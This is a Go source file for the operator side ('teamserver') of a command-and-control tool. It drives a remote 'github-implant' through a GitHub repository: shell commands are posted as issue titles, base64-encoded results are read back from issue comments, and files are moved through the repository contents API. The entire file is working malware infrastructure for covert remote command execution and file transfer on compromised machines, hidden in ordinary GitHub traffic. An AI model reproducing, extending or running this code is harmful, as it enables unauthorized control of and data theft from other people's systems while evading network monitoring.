package main

import (
	"bufio"
	"bytes"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"io/ioutil"
	"net/http"
	"os"
	"path/filepath"
	"strings"
	"time"
)

// Issue 用于解析 GitHub API 返回的 issue 列表中的单个 issue 数据
type Issue struct {
	Number int `json:"number"` // Issue 编号
}

// 获取当前仓库的最晚 issue 编号，倒序
func GetOldestIssueNumber(token, owner, repo string) (int, error) {
	// 将 direction=desc 改为 direction=asc，以获取最早的 issue
	url := fmt.Sprintf("https://api.github.com/repos/%s/%s/issues?state=all&sort=created&direction=desc", owner, repo)

	req, err := http.NewRequest("GET", url, nil)
	if err != nil {
		return 0, fmt.Errorf("failed to create request: %v", err)
	}
	req.Header.Add("Authorization", "Bearer "+token)
	req.Header.Add("Accept", "application/vnd.github.v3+json")

	client := &http.Client{}
	resp, err := client.Do(req)
	if err != nil {
		return 0, fmt.Errorf("failed to get issues: %v", err)
	}
	defer resp.Body.Close()

	body, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		return 0, fmt.Errorf("failed to read response body: %v", err)
	}

	// 解析返回的 issue 列表
	var issues []Issue
	if err := json.Unmarshal(body, &issues); err != nil {
		return 0, fmt.Errorf("failed to parse JSON: %v", err)
	}

	// 检查是否有返回的 issue
	if len(issues) == 0 {
		//return 0, fmt.Errorf("no issues found")
		return 1, nil
	}

	// 返回最早创建的 issue 的编号
	return issues[0].Number + 1, nil
}

func Error(msg string, err error) string {
	return fmt.Sprintf("%s (%v)", msg, err)
}

// base64 encode function
func base64Encode(plain string) string {
	return base64.StdEncoding.EncodeToString([]byte(plain))
}

// base64 decode function
func base64Decode(encoded string) (string, error) {
	data, err := base64.StdEncoding.DecodeString(encoded)
	if err != nil {
		return "", err
	}
	return string(data), nil
}

// Create GitHub issue
func PostIssue(token, owner, repo, task string) error {
	client := &http.Client{}

	url := fmt.Sprintf("https://api.github.com/repos/%s/%s/issues", owner, repo)
	payload := strings.NewReader(fmt.Sprintf(`{"title":"%s", "body":"What's up"}`, task))

	req, err := http.NewRequest("POST", url, payload)
	if err != nil {
		return fmt.Errorf("failed to create request: %v", err)
	}

	req.Header.Add("Authorization", "Bearer "+token)
	req.Header.Add("Content-Type", "application/json")
	req.Header.Add("Accept", "application/vnd.github+json")

	resp, err := client.Do(req)
	if err != nil {
		return fmt.Errorf("failed in HttpSendRequest: %v", err)
	}
	defer resp.Body.Close()

	_, err = ioutil.ReadAll(resp.Body)
	if err != nil {
		return fmt.Errorf("failed to read response: %v", err)
	}

	fmt.Println("[+] Issue Created!")
	return nil
}

// Get GitHub comments
func GetComment(token, owner, repo, issueNbr string) (string, error) {
	client := &http.Client{}

	url := fmt.Sprintf("https://api.github.com/repos/%s/%s/issues/%s/comments", owner, repo, issueNbr)

	req, err := http.NewRequest("GET", url, nil)
	if err != nil {
		return "", fmt.Errorf("failed to create request: %v", err)
	}

	req.Header.Add("Authorization", "Bearer "+token)
	req.Header.Add("Accept", "application/vnd.github+json")

	resp, err := client.Do(req)
	if err != nil {
		return "", fmt.Errorf("failed to send request: %v", err)
	}
	defer resp.Body.Close()

	body, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		return "", fmt.Errorf("failed to read response: %v", err)
	}

	//fmt.Println(string(body))
	return string(body), nil
}

// Find the comment body in the response
func findCommentBody(comment string) string {
	start := strings.Index(comment, `"body":"`)
	if start == -1 {
		return ""
	}
	start += len(`"body":"`)

	end := strings.Index(comment[start:], `",`)
	if end == -1 {
		return ""
	}

	return comment[start : start+end]
}

func uploadFile(token, user, repo, localFilePath, remoteFileName string) error {
	// 读取本地文件内容
	content, err := ioutil.ReadFile(localFilePath)
	if err != nil {
		return fmt.Errorf("failed to read file: %v", err)
	}

	// 将文件内容进行 Base64 编码
	encodedContent := base64.StdEncoding.EncodeToString(content)

	// 构造 GitHub API 的 URL
	url := fmt.Sprintf("https://api.github.com/repos/%s/%s/contents/%s", user, repo, remoteFileName)

	// 构造提交信息
	requestBody, err := json.Marshal(map[string]string{
		"message": "Add " + remoteFileName + " via API",
		"content": encodedContent,
	})
	if err != nil {
		return fmt.Errorf("failed to marshal request body: %v", err)
	}

	// 构造 HTTP 请求
	req, err := http.NewRequest("PUT", url, bytes.NewBuffer(requestBody))
	if err != nil {
		return fmt.Errorf("failed to create request: %v", err)
	}

	// 设置请求头
	req.Header.Set("Authorization", "token "+token)
	req.Header.Set("Accept", "application/vnd.github.v3+json")

	// 发送请求
	client := &http.Client{}
	resp, err := client.Do(req)
	if err != nil {
		return fmt.Errorf("failed to send request: %v", err)
	}
	defer resp.Body.Close()

	// 处理响应
	if resp.StatusCode == http.StatusCreated {
		fmt.Println(fmt.Sprintf("upload local file %s to github success...", localFilePath))
	} else {
		body, _ := ioutil.ReadAll(resp.Body)
		return fmt.Errorf("failed to upload file: %s", string(body))
	}

	return nil
}

// downloadFile 从GitHub仓库下载文件
func downloadFile(token, user, repo, remoteFilePath string) error {
	// 构建请求URL
	url := fmt.Sprintf("https://api.github.com/repos/%s/%s/contents/%s", user, repo, remoteFilePath)

	// 创建请求
	req, err := http.NewRequest("GET", url, nil)
	if err != nil {
		return fmt.Errorf("create request error: %v", err)
	}

	// 设置请求头
	req.Header.Set("Authorization", "token "+token)
	req.Header.Set("Accept", "application/vnd.github.v3+json")

	// 发送请求
	client := &http.Client{}
	resp, err := client.Do(req)
	if err != nil {
		return fmt.Errorf("request error: %v", err)
	}
	defer resp.Body.Close()

	// 检查响应状态
	if resp.StatusCode != http.StatusOK {
		body, _ := ioutil.ReadAll(resp.Body)
		return fmt.Errorf("download fail, status_code: %d，resp: %s", resp.StatusCode, body)
	}

	// 读取响应体
	var fileContent struct {
		Content string `json:"content"`
	}
	if err := json.NewDecoder(resp.Body).Decode(&fileContent); err != nil {
		return fmt.Errorf("decode Resp error: %v", err)
	}

	// 将Base64内容解码
	data, err := base64.StdEncoding.DecodeString(fileContent.Content)
	if err != nil {
		return fmt.Errorf("base64 decode content error: %v", err)
	}

	// 保存到当前目录
	localFileName := filepath.Base(remoteFilePath)
	if err := ioutil.WriteFile(localFileName, data, 0644); err != nil {
		return fmt.Errorf("write file error: %v", err)
	}

	fmt.Printf("file download success: %s\n", localFileName)
	return nil
}

func printHelp() {
	fmt.Println(" - help : show this help menu")
	fmt.Println(" - pwd : print working directory")
	fmt.Println(" - whoami : get username")
	fmt.Println(" - cmd <command> : execute command")
	fmt.Println(" - upload <local_file_path> <remote_file_name> : upload local file to the github-implant")
	fmt.Println(" - download <implant_file_path> <remote_file_name> : download file of github-implant to current local path")
	fmt.Println(" - exit : kill the connection with the github-implant")
}

func main() {
	if len(os.Args) < 4 {
		fmt.Println("Usage: teamserver <AccessToken> <Username> <Repository>")
		return
	}

	token := os.Args[1]
	owner := os.Args[2]
	repo := os.Args[3]
	//task := ""
	issueNbr, err := GetOldestIssueNumber(token, owner, repo)
	if err != nil {
		fmt.Println(fmt.Errorf("Failed to get issue number: %v", err))
		return
	}
	fmt.Println(fmt.Sprintf("the final issue number is %d", issueNbr))

	for {
		fmt.Print("Implant # ")
		//fmt.Scanln(&task)
		reader := bufio.NewReader(os.Stdin)
		task, err := reader.ReadString('\n')
		task = strings.TrimSpace(task)
		//fmt.Println(task)
		if err != nil {
			fmt.Println("read commnad error：", err)
			continue
		}
		if task == "pwd" || task == "whoami" || task == "exit" || strings.HasPrefix(task, "cmd") {
			fmt.Printf("task: %s\n", task)
			if err := PostIssue(token, owner, repo, task); err != nil {
				fmt.Println(Error("Failed to post issue", err))
				continue
			}

			time.Sleep(5 * time.Second)

			issueNbrStr := fmt.Sprintf("%d", issueNbr)
			comment, err := GetComment(token, owner, repo, issueNbrStr)
			if err != nil {
				fmt.Println(Error("Failed to get comment", err))
				continue
			}
			commentResp := findCommentBody(comment)
			issueNbr++
			if commentResp != "" {
				decoded, err := base64Decode(commentResp)
				if err != nil {
					fmt.Println("Decode Failure")
					continue
				}
				fmt.Printf("Response Decoded: \n%s\n", decoded)
			} else {
				fmt.Println("No Response found")
			}
		} else if strings.HasPrefix(task, "upload") {
			fmt.Printf("task: %s\n", task)
			if err := PostIssue(token, owner, repo, task); err != nil {
				fmt.Println(Error("Failed to post issue", err))
				continue
			}

			fmt.Println("waiting for the file upload...")
			success_flag := false
			args := strings.Fields(task)
			local_file_path := args[1]
			remote_file_name := args[2]
			start_time := time.Now()
			uploadFile(token, owner, repo, local_file_path, remote_file_name)
			// 写个循环检测文件是否已经上传完成
			for {
				issueNbrStr := fmt.Sprintf("%d", issueNbr)
				comment, err := GetComment(token, owner, repo, issueNbrStr)
				if err != nil {
					fmt.Println(Error("Failed to get comment", err))
					continue
				}
				commentResp := findCommentBody(comment)
				if commentResp != "" {
					decoded, err := base64Decode(commentResp)
					if err != nil {
						fmt.Println("Decode Failure")
					}
					if decoded == "upload success" {
						success_flag = true
					}
					break
				}
			}
			if success_flag == true {
				usertime := time.Since(start_time)
				fmt.Println("file upload success, time-consuming: ", usertime)
			} else {
				fmt.Println("file upload fail, please try again")
			}
			issueNbr++
		} else if strings.HasPrefix(task, "download") {
			// 思路跟上传文件一样，先把implant注入端的文件上传到github-repo，然后再从repo下载到本地当前目录
			fmt.Printf("task: %s\n", task)
			if err := PostIssue(token, owner, repo, task); err != nil {
				fmt.Println(Error("Failed to post issue", err))
				continue
			}
			fmt.Println("waiting for the file to download...")

			success_flag := false
			args := strings.Fields(task)
			implant_file_path := args[1]
			remote_file_name := args[2]
			// 隔一段时间检测第issueNbr个issue的comment是否upload success
			//implant_file_path是implant端首先要上传需要下载的文件到github-repo
			//remote_file_name是直接通过github-repo将需要的文件下载到本地
			for {
				issueNbrStr := fmt.Sprintf("%d", issueNbr)
				comment, err := GetComment(token, owner, repo, issueNbrStr)
				if err != nil {
					fmt.Println(Error("Failed to get comment", err))
					continue
				}
				commentResp := findCommentBody(comment)
				if commentResp != "" {
					decoded, err := base64Decode(commentResp)
					if err != nil {
						fmt.Println("Decode Failure")
					}
					//implant成功将文件上传到github-repo，标记一下
					if decoded == "upload success" {
						success_flag = true
						fmt.Println("upload feishu-implant file", implant_file_path, "to github success...")
					} else {
						fmt.Println("upload feishu-implant file", implant_file_path, "to github failed...")
					}
					break
				}
				time.Sleep(1 * time.Second)
			}
			//让github反应一下
			time.Sleep(3 * time.Second)
			start_time := time.Now()
			if success_flag == true {
				if err := downloadFile(token, owner, repo, remote_file_name); err != nil {
					fmt.Println("download github file Error:", remote_file_name, err)
				} else {
					usertime := time.Since(start_time)
					fmt.Println("feishu-implant file", implant_file_path, "download to local success, time-consuming:", usertime)
				}
			} else {
				fmt.Println("file download fail, please try again")
			}
			issueNbr++
		} else {
			printHelp()
		}
	}
}
